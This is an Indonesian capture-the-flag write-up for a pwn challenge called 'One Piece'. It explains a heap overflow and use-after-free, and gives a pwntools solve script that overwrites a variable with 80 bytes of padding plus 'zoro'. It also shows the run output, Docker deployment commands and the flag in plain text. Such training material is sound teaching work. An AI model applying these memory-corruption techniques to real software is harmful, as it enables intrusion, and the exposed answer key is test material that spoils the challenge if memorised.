## One Piece (309 Pts)

- [One Piece](#one-piece)
- [Deskripsi](#deskripsi)
- [Konsep soal](#konsep-soal)
- [HINT](#hint)
- [Proof of Concept](#proof-of-concept)
- [Refrensi](#refrensi)

## Deskripsi
Temukan One Piece dan jadilah Raja Bajak Laut

Author : **Dolf7**

Format Flag : Hology4{}

## Konsep soal
- Heap Overflow
- Use-After-Free
  

Untuk mendapat flag peserta harus dapat mengoverwrite suate variable. variable akan mempoint ke heap tapi sebelummnya heap sudah di penuhi oleh variable varible lain. Sehingga untuk dapat mengoverwite suatu variable yang dituju perlu mem-'free' heap yang ada. dan melakukan overwrite tsb.
   

## HINT
1. Marijoa terletak di Redline yang sangat tinggi. Bebaskan yang tertahan disana.
2. Yang pertama akan sangat membantu.


## Proof of Concept
```
#!usr/bin/env python3
from pwn import *
p = process('./onepiece')

elf = ELF('onepiece')
#x = 0x6f726f7a
x = b'zoro'
buff = b'a'*80
#payload = buff + p64(x)
payload = buff + x

p.sendline(b'1')
p.sendline(b'3')
p.sendline(b'6')
#p.recvuntil("ada berapa red poneglyph?")
p.sendline(b'4')
p.sendline(b'7')
p.sendline(b'8')
p.sendline(payload)
p.sendline(b'9')
p.interactive()
```

ouput :
```
$ python3 solve.py 
[+] Starting local process './onepiece': pid 13792
[*] '/home/dolf/Documents/POROS/Hology4/onepiece/onepiece'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] Switching to interactive mode
Cari Road poneglyph dan temukan One Piece

1. Saobaody
2. Fishaman Island
3. New World
4. Punk Hazard
5. Dressrosa
6. Zou
7. Whole Cake Island (wci)
8. Wano Kuni
9. Laugh_tale
Datang Pertama : zoro
1. Saobaody
2. Fishaman Island
3. New World
4. Punk Hazard
5. Dressrosa
6. Zou
7. Whole Cake Island (wci)
8. Wano Kuni
9. Laugh_tale
Welcome to new World

1. Saobaody
2. Fishaman Island
3. New World
4. Punk Hazard
5. Dressrosa
6. Zou
7. Whole Cake Island (wci)
8. Wano Kuni
9. Laugh_tale
ada berapa red poneglyph?
Okay

1. Saobaody
2. Fishaman Island
3. New World
4. Punk Hazard
5. Dressrosa
6. Zou
7. Whole Cake Island (wci)
8. Wano Kuni
9. Laugh_tale
tankman & snakeman

1. Saobaody
2. Fishaman Island
3. New World
4. Punk Hazard
5. Dressrosa
6. Zou
7. Whole Cake Island (wci)
8. Wano Kuni
9. Laugh_tale
Ryuo beats dragon
btw, apa arc setelah wano??

1. Saobaody
2. Fishaman Island
3. New World
4. Punk Hazard
5. Dressrosa
6. Zou
7. Whole Cake Island (wci)
8. Wano Kuni
9. Laugh_tale
Kamu menemukannya, Raja Bajak Laut, 
hology4{0ne_Piece_1s_Rea1}

```

## Refrensi
Tidak ada

## Deployment

```
docker build -t onepiece
docker run -d --name=onepiece -p 38823:38823/tcp onepiece
crontab /path/to/crontab
```

## Flag
<details>
<summary>Tekan untuk melihat flag</summary>

    hology4{0ne_Piece_1s_Rea1}

</details>